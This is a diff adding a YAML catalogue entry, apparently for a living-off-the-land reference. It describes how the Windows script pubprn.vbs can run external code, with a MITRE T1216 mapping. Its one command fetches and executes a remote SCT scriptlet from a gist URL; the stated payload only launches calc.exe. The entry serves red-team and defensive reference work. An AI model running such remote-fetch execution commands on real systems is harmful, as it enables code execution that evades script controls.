@@ -1,0 +1,38 @@
+---
+Name: 'Pubprn.vbs'
+Description: 'Execute external code escaping script'
+Created: '2018-07-31'
+Commands:
+  - Command: pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/api0cradle/fb164762143b1ff4042d9c662171a568/raw/709aff66095b7f60e5d6f456a5e42021a95ca802/test.sct
+    Description: Executes calc.exe from remote SCT.
+Windows Binary: true
+Bypasses Default AppLocker Rules: false
+Notes: ''
+MITRE:
+  - ID: 'T1216'
+    Link: 'https://attack.mitre.org/wiki/Technique/T1216'
+Atomic Red Teaming:
+  - Description: ''
+    Code: ''
+Full path:
+  - Path: 'C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs'
+  - Path: 'C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs'
+Verified on OS:
+  - Windows 10 1803: false
+  - Windows 10 1709: false
+  - Windows 10 1709: false
+  - Windows 10 1703: false
+  - Windows 10 1607: false
+  - Windows 10 1511: false
+  - Windows 10 1507: false
+  - Windows 8.1: false
+  - Windows 8: false
+  - Windows 7: false
+Resources:
+  - Link: 'https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/'
+  - Link: 'https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology'
+Acknowledgement:
+  - Name: 'Matt Nelson'
+    TwitterHandle: '@enigma0x3'
+    Blog: 'https://enigma0x3.net'
+---
